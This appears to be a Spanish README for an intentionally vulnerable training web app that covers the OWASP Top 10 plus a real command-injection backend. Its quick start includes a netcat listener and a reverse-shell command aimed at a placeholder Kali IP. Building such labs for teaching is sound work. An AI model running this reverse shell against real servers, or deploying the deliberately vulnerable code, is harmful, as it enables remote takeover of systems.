<div align="center">
<img width="1200" height="475" alt="GHBanner" src="https://github.com/user-attachments/assets/0aa67016-6eaf-458a-adb2-6e31a0763ed6" />
</div>

# 🛡️ Aplicación Web Vulnerable - OWASP Top 10

Esta es una aplicación educativa que simula las 10 vulnerabilidades más críticas de seguridad web según OWASP.

## ⚠️ ADVERTENCIA IMPORTANTE
Esta aplicación contiene vulnerabilidades intencionales para fines educativos. **NO usar en producción**.

## 🚨 NUEVA CARACTERÍSTICA: Command Injection Real
Ahora incluye un servidor backend que ejecuta comandos reales del sistema para reverse shells auténticas.

## 📁 Estructura del proyecto

```
├── components/          # Componentes React
│   ├── Header.tsx
│   ├── Sidebar.tsx
│   └── Welcome.tsx
├── pages/              # Páginas de vulnerabilidades
│   ├── A01_BrokenAccessControl.tsx
│   ├── A02_CryptographicFailures.tsx
│   ├── A03_Injection.tsx
│   ├── A04_InsecureDesign.tsx
│   ├── A05_SecurityMisconfiguration.tsx
│   ├── A06_VulnerableComponents.tsx
│   ├── A07_IdentificationAndAuthenticationFailures.tsx
│   ├── A08_SoftwareAndDataIntegrityFailures.tsx
│   ├── A09_SecurityLoggingAndMonitoringFailures.tsx
│   ├── A10_ServerSideRequestForgery.tsx
│   └── CommandInjection.tsx    # 💀 NUEVA: Command Injection real
├── server.js           # 🚨 Servidor backend vulnerable
├── App.tsx
├── index.tsx
└── package.json
```

## 🚀 Cómo ejecutar

### Solo Frontend (Simulación):
```bash
npm install
npm run dev
```

### 💀 Backend Vulnerable (Ejecución Real):
```bash
npm install
npm run build
npm run server
# Aplicación disponible en http://localhost:3001
```

## 🎯 Vulnerabilidades Incluidas

### ✅ OWASP Top 10 2021:
1. **A01** - Control de Acceso Roto
2. **A02** - Fallos Criptográficos  
3. **A03** - Inyección (XSS DOM real)
4. **A04** - Diseño Inseguro
5. **A05** - Configuración de Seguridad Incorrecta
6. **A06** - Componentes Vulnerables (con exploits)
7. **A07** - Fallas de Identificación y Autenticación
8. **A08** - Fallas de Integridad de Software
9. **A09** - Fallas de Registro y Monitoreo
10. **A10** - Server-Side Request Forgery (SSRF mejorado)

### 🆕 Vulnerabilidad Extra:
- **💀 Command Injection** - Ejecución real de comandos y reverse shells

## 🔥 Características Mejoradas

### A03 - XSS DOM:
- ✅ Ejecuta JavaScript real
- ✅ Payloads funcionales
- ✅ Ejemplos interactivos

### A06 - Componentes Vulnerables:
- ✅ Simula librería vulnerable real
- ✅ Exploits de ejemplo
- ✅ Tracking de payloads

### 💀 Command Injection:
- ✅ **Ejecución real de comandos**
- ✅ **Reverse shells auténticas**
- ✅ Conexión directa con Kali Linux
- ✅ Payloads de bash, netcat, python
- ✅ Simulación de fallback si no hay backend

### A10 - SSRF:
- ✅ Acceso a servicios internos
- ✅ Metadata de AWS simulado
- ✅ File inclusion
- ✅ Network scanning

## 🚨 Para Pentesting Real

Ver [DEPLOYMENT.md](DEPLOYMENT.md) para instrucciones completas de despliegue con backend vulnerable.

### Quick Start para Reverse Shell:
1. **Kali Linux:** `nc -lvnp 4444`
2. **Servidor:** `npm run server`
3. **Web:** Ir a "💀 Command Injection"
4. **Comando:** `nc -e /bin/bash TU_KALI_IP 4444`

## 📚 Propósito Educativo

Esta aplicación está diseñada para:
- 🎓 Enseñar vulnerabilidades web
- 🔍 Practicar pentesting ético  
- 🛡️ Entender defensas de seguridad
- 💡 Demostrar el impacto real de las vulnerabilidades

## Run Locally

**Prerequisites:**  Node.js


1. Install dependencies:
   `npm install`
2. Set the `GEMINI_API_KEY` in [.env.local](.env.local) to your Gemini API key
3. Run the app:
   `npm run dev`
